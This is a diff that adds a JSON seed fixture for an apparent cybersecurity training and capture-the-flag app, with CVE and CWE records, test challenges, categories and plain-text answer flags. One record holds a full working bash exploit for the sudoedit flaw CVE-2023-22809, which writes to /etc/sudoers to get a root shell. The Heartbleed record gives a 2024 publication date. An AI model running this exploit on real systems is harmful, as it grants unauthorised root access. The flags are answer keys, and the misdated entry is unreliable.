@@ -1,0 +1,331 @@
+[
+  {
+    "model": "cybersec.cve",
+    "pk": 1,
+    "fields": {
+      "cve_id": "CVE-2017-0144",
+      "description": "The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, aka \"Windows SMB Remote Code Execution Vulnerability.\" This vulnerability is different from those described in CVE-2017-0143, CVE-2017-0145, CVE-2017-0146, and CVE-2017-0148.",
+      "cvss": 8.1,
+      "published_date": "2017-03-16",
+      "cwe": [
+        1
+      ]
+    }
+  },
+  {
+    "model": "cybersec.cve",
+    "pk": 2,
+    "fields": {
+      "cve_id": "CVE-2022-0543",
+      "description": "It was discovered, that redis, a persistent key-value database, due to a packaging issue, is prone to a (Debian-specific) Lua sandbox escape, which could result in remote code execution.",
+      "cvss": 10.0,
+      "published_date": "2022-02-18",
+      "cwe": [
+        2
+      ]
+    }
+  },
+  {
+    "model": "cybersec.cve",
+    "pk": 3,
+    "fields": {
+      "cve_id": "CVE-2014-0160",
+      "description": "The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, aka the Heartbleed bug.",
+      "cvss": 7.5,
+      "published_date": "2024-04-07",
+      "cwe": [
+        3
+      ]
+    }
+  },
+  {
+    "model": "cybersec.cve",
+    "pk": 4,
+    "fields": {
+      "cve_id": "CVE-2023-22809",
+      "description": "In Sudo before 1.9.12p2, the sudoedit (aka -e) feature mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. Affected versions are 1.8.0 through 1.9.12.p1. The problem exists because a user-specified editor may contain a \"--\" argument that defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file' value.",
+      "cvss": 7.8,
+      "published_date": "2023-01-18",
+      "cwe": [
+        4
+      ]
+    }
+  },
+  {
+    "model": "cybersec.cve",
+    "pk": 5,
+    "fields": {
+      "cve_id": "CVE-2024-1086",
+      "description": "A use-after-free vulnerability in the Linux kernel's netfilter: nf_tables component can be exploited to achieve local privilege escalation. The nft_verdict_init() function allows positive values as drop error within the hook verdict, and hence the nf_hook_slow() function can cause a double free vulnerability when NF_DROP is issued with a drop error which resembles NF_ACCEPT. We recommend upgrading past commit f342de4e2f33e0e39165d8639387aa6c19dff660.",
+      "cvss": 7.8,
+      "published_date": "2024-01-31",
+      "cwe": [
+        5
+      ]
+    }
+  },
+  {
+    "model": "cybersec.cwe",
+    "pk": 1,
+    "fields": {
+      "cwe_id": "CWE-20",
+      "name": "Improper Input Validation",
+      "description": ""
+    }
+  },
+  {
+    "model": "cybersec.cwe",
+    "pk": 2,
+    "fields": {
+      "cwe_id": "CWE-862",
+      "name": "Missing Authorization",
+      "description": "Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.\r\n\r\nWhen access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution."
+    }
+  },
+  {
+    "model": "cybersec.cwe",
+    "pk": 3,
+    "fields": {
+      "cwe_id": "CWE-125",
+      "name": "Out-of-bounds Read",
+      "description": "Typically, this can allow attackers to read sensitive information from other memory locations or cause a crash. A crash can occur when the code reads a variable amount of data and assumes that a sentinel exists to stop the read operation, such as a NUL in a string. The expected sentinel might not be located in the out-of-bounds memory, causing excessive data to be read, leading to a segmentation fault or a buffer overflow. The product may modify an index or perform pointer arithmetic that references a memory location that is outside of the boundaries of the buffer. A subsequent read operation then produces undefined or unexpected results."
+    }
+  },
+  {
+    "model": "cybersec.cwe",
+    "pk": 4,
+    "fields": {
+      "cwe_id": "CWE-269",
+      "name": "Improper Privilege Management",
+      "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
+    }
+  },
+  {
+    "model": "cybersec.cwe",
+    "pk": 5,
+    "fields": {
+      "cwe_id": "CWE-416",
+      "name": "Use After Free",
+      "description": "The use of previously-freed memory can have any number of adverse consequences, ranging from the corruption of valid data to the execution of arbitrary code, depending on the instantiation and timing of the flaw. The simplest way data corruption may occur involves the system's reuse of the freed memory. Use-after-free errors have two common and sometimes overlapping causes:\r\n\r\n    Error conditions and other exceptional circumstances.\r\n    Confusion over which part of the program is responsible for freeing the memory. \r\n\r\nIn this scenario, the memory in question is allocated to another pointer validly at some point after it has been freed. The original pointer to the freed memory is used again and points to somewhere within the new allocation. As the data is changed, it corrupts the validly used memory; this induces undefined behavior in the process.\r\n\r\nIf the newly allocated data happens to hold a class, in C++ for example, various function pointers may be scattered within the heap data. If one of these function pointers is overwritten with an address to valid shellcode, execution of arbitrary code can be achieved."
+    }
+  },
+  {
+    "model": "cybersec.exploit",
+    "pk": 1,
+    "fields": {
+      "name": "Exploit for CVE-2023-22809",
+      "description": "This script automates the exploitation of the CVE-2023-22809 vulnerability to gain a root shell.",
+      "exploit_code": "#!/usr/bin/env bash\r\n#\r\n# Exploit Title: sudo 1.8.0 - 1.9.12p1 - Privilege Escalation\r\n# \r\n# Exploit Author: n3m1.sys\r\n# CVE: CVE-2023-22809\r\n# Date: 2023/01/21\r\n# Vendor Homepage: https://www.sudo.ws/\r\n# Software Link: https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz\r\n# Version: 1.8.0 to 1.9.12p1\r\n# Tested on: Ubuntu Server 22.04 - vim 8.2.4919 - sudo 1.9.9\r\n#\r\n# Running this exploit on a vulnerable system allows a localiattacker to gain \r\n# a root shell on the machine.\r\n#\r\n# The exploit checks if the current user has privileges to run sudoedit or \r\n# sudo -e on a file as root. If so it will open the sudoers file for the\r\n# attacker to add a line to gain privileges on all the files and get a root \r\n# shell.\r\n\r\nif ! sudo --version | head -1 | grep -qE '(1\\.8.*|1\\.9\\.[0-9]1?(p[1-3])?|1\\.9\\.12p1)$'\r\nthen\r\n    echo \"> Currently installed sudo version is not vulnerable\"\r\n    exit 1\r\nfi\r\n\r\nEXPLOITABLE=$(sudo -l | grep -E \"sudoedit|sudo -e\" | grep -E '\\(root\\)|\\(ALL\\)|\\(ALL : ALL\\)' | cut -d ')' -f 2-)\r\n\r\nif [ -z \"$EXPLOITABLE\" ]; then\r\n    echo \"> It doesn't seem that this user can run sudoedit as root\"\r\n    read -p \"Do you want to proceed anyway? (y/N): \" confirm && [[ $confirm == [yY] ]] || exit 2\r\nelse\r\n    echo \"> BINGO! User exploitable\"\r\nfi\r\n\r\necho \"> Opening sudoers file, please add the following line to the file in order to do the privesc:\"\r\necho \"$USER ALL=(ALL:ALL) ALL\"\r\nread -n 1 -s -r -p \"Press any key to continue...\"\r\nEDITOR=\"vim -- /etc/sudoers\" $EXPLOITABLE\r\nsudo su root\r\nexit 0",
+      "cve": [
+        4
+      ]
+    }
+  },
+  {
+    "model": "cybersec.challenge",
+    "pk": 2,
+    "fields": {
+      "category": 7,
+      "image": "images/4964803.png",
+      "score": 70,
+      "difficulty": "EASY",
+      "name": "Test Crypto Chall",
+      "description": "Test Crypto Chall",
+      "cve": [
+        3
+      ],
+      "cwe": []
+    }
+  },
+  {
+    "model": "cybersec.challenge",
+    "pk": 3,
+    "fields": {
+      "category": 6,
+      "image": "images/Everest_North_Face_toward_Base_Camp_Tibet_Luca_Galuzzi_2006.jpg",
+      "score": 100,
+      "difficulty": "EASY",
+      "name": "Test OSINT",
+      "description": "Test osint challenge",
+      "cve": [
+        1,
+        2,
+        4
+      ],
+      "cwe": []
+    }
+  },
+  {
+    "model": "cybersec.challenge",
+    "pk": 4,
+    "fields": {
+      "category": 2,
+      "image": "images/exploitation.png",
+      "score": 10,
+      "difficulty": "HARD",
+      "name": "Binary Exploitation example",
+      "description": "Example pwn challenge",
+      "cve": [],
+      "cwe": [
+        5
+      ]
+    }
+  },
+  {
+    "model": "cybersec.challenge",
+    "pk": 5,
+    "fields": {
+      "category": 5,
+      "image": "images/bf212ad9717fa0aaa4b1c1d9217959ae.jpg",
+      "score": 100,
+      "difficulty": "HARD",
+      "name": "RF challenge",
+      "description": "Example radio frequency challenge",
+      "cve": [],
+      "cwe": [
+        2
+      ]
+    }
+  },
+  {
+    "model": "cybersec.challenge",
+    "pk": 6,
+    "fields": {
+      "category": 4,
+      "image": "images/JD-37-512.webp",
+      "score": 100,
+      "difficulty": "EASY",
+      "name": "Example rev",
+      "description": "Example reverse engineering challenge",
+      "cve": [],
+      "cwe": []
+    }
+  },
+  {
+    "model": "cybersec.challenge",
+    "pk": 7,
+    "fields": {
+      "category": 3,
+      "image": "images/What_is_a_SQL_injection.webp",
+      "score": 40,
+      "difficulty": "MEDIUM",
+      "name": "Example Web",
+      "description": "Example Web",
+      "cve": [],
+      "cwe": [
+        3
+      ]
+    }
+  },
+  {
+    "model": "cybersec.flag",
+    "pk": 2,
+    "fields": {
+      "challenge": 2,
+      "flag": "crypto{one}",
+      "hint": "crypto"
+    }
+  },
+  {
+    "model": "cybersec.flag",
+    "pk": 3,
+    "fields": {
+      "challenge": 2,
+      "flag": "crypto{two}",
+      "hint": "crypto 2"
+    }
+  },
+  {
+    "model": "cybersec.flag",
+    "pk": 4,
+    "fields": {
+      "challenge": 3,
+      "flag": "osint{one}",
+      "hint": "osint test"
+    }
+  },
+  {
+    "model": "cybersec.flag",
+    "pk": 5,
+    "fields": {
+      "challenge": 4,
+      "flag": "pwn{gfdg}",
+      "hint": "pwn gfdg"
+    }
+  },
+  {
+    "model": "cybersec.flag",
+    "pk": 6,
+    "fields": {
+      "challenge": 5,
+      "flag": "rf{i-hate-this-type-of-challenge}",
+      "hint": "my opinion"
+    }
+  },
+  {
+    "model": "cybersec.flag",
+    "pk": 7,
+    "fields": {
+      "challenge": 6,
+      "flag": "yoda{powerful_you_have_become",
+      "hint": "I have this one"
+    }
+  },
+  {
+    "model": "cybersec.flag",
+    "pk": 8,
+    "fields": {
+      "challenge": 7,
+      "flag": "web{test}",
+      "hint": "test"
+    }
+  },
+  {
+    "model": "cybersec.category",
+    "pk": 2,
+    "fields": {
+      "name": "Pwn",
+      "description": "Binary Exploitation"
+    }
+  },
+  {
+    "model": "cybersec.category",
+    "pk": 3,
+    "fields": {
+      "name": "Web",
+      "description": "Web exploitation"
+    }
+  },
+  {
+    "model": "cybersec.category",
+    "pk": 4,
+    "fields": {
+      "name": "Rev",
+      "description": "Reverse engineering challenges"
+    }
+  },
+  {
+    "model": "cybersec.category",
+    "pk": 5,
+    "fields": {
+      "name": "RF",
+      "description": "Radio Frequency challenges"
+    }
+  },
+  {
+    "model": "cybersec.category",
+    "pk": 6,
+    "fields": {
+      "name": "Misc",
+      "description": "Miscellaneous challenges"
+    }
+  },
+  {
+    "model": "cybersec.category",
+    "pk": 7,
+    "fields": {
+      "name": "Crypto",
+      "description": "Cryptographic challenges"
+    }
+  }
+]
